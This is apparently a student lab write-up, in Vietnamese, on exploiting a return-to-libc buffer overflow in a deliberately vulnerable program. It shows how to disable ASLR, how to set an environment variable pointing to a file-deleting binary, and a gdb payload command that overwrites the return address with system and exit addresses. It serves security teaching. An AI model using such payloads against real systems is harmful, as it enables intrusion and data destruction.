# Lab #3: exploit return-to-lib-c vulnerability, delete file "dummy" in directory /tmp/dummy using environment variable.

Chương trình vuln.c:

![image](https://github.com/user-attachments/assets/bbbda87b-19ca-436b-a825-79336ed28113)

Đầu tiên, Tạo 1 dummyfile bằng lệnh `touch dummyfile`

Kiểm tra lại dummyfile có tồn tại chưa:

![image](https://github.com/user-attachments/assets/27872dbf-36b9-4a38-9663-3840e3d5eecb)


Bắt đầu biên dịch chương trình

![image](https://github.com/user-attachments/assets/5ef2727e-c075-423f-b678-98248171fc62)

`-z execstack`: cho phép thực thi code trên stack

Tắt chế độ cấp phát địa chỉ stack ngẫu nhiên

`sudo sysctl -w kernel.randomize_va_space=0`

![image](https://github.com/user-attachments/assets/37cc1b16-9177-4c97-88ce-51e552de75cc)

Bắt đầu biên dịch file_del.asm 

![image](https://github.com/user-attachments/assets/eff4c2c1-2389-418f-92b3-94dbe04c7a8c)

Sau đó tạo 1 biến môi trường có tên là exploitPath với đường dẫn đến file 'file_del'

![image](https://github.com/user-attachments/assets/754720b8-94be-4046-887c-a2b9ddd2b445)

Vẽ stackframe ta thấy được rằng

![image](https://github.com/user-attachments/assets/b646cafb-6b32-4e27-b4e1-4550b21ab1ce)

Để khai khác chương trình, ta cần overflow các địa chỉ sau:

- Để chạy được hàm `system` thì phải đè lên địa chỉ `system` lên địa chỉ `return address`
- Để về chương trình chính, địa chỉ `exit` phải đè lên bytes kế tiếp là `argc`
- Đối số của hàm system (`exploitPath` mới tạo hồi nãy) sẽ đè lên lên `argv`

Trước hết, ta phải tìm các địa chỉ bằng gdb:

  chạy chương trình trước khi tìm kiếm
  
![image](https://github.com/user-attachments/assets/a84afa5f-8662-458c-882b-9fd264993606)
![image](https://github.com/user-attachments/assets/13cb8354-34fa-4282-b4e8-3c42240d0d5e)

câu lệnh cuối cùng sẽ là: 

`r $(python -c "print('a'*68+'\xb0\x0d\xe5\xf7'+'\xe0\x49\xe4\xf7'+'\x6d\xd9\xff\xff')")`

kết quả:

![image](https://github.com/user-attachments/assets/ae351e39-2849-4b89-9dae-8a659950d9c4)












